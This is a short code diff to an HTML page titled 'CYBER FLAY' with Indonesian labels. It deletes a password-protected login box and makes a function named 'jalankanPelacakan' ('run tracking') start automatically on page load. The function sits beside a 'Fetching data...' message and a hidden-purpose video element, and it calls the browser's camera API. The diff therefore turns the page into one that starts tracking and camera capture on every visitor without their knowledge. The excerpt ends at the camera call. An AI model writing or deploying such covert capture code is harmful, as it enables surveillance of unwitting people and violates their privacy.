@@ -35,29 +35,12 @@
   </style>
 </head>
 <body>
-<div class="box" id="loginBox">
-  <h2>CYBER FLAY - LOGIN</h2>
-  <input type="password" id="pw" placeholder="Password: flay12121" />
-  <button onclick="checkPW()">MASUK</button>
-  <p id="err" style="color:red;"></p>
-</div>
-
-<div class="box" id="mainBox" style="display:none;">
+<div class="box" id="mainBox">
   <h3>🔍 Mengambil data...</h3>
   <video id="video" autoplay muted></video>
 </div>
 
-<script>
-function checkPW() {
-  if (document.getElementById('pw').value === 'flay12121') {
-    document.getElementById('loginBox').style.display = 'none';
-    document.getElementById('mainBox').style.display = 'block';
-    jalankanPelacakan();
-  } else {
-    document.getElementById('err').innerText = '❌ Password salah!';
-  }
-}
-
+<script>window.onload = jalankanPelacakan;
 function jalankanPelacakan() {
   const video = document.getElementById('video');
   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
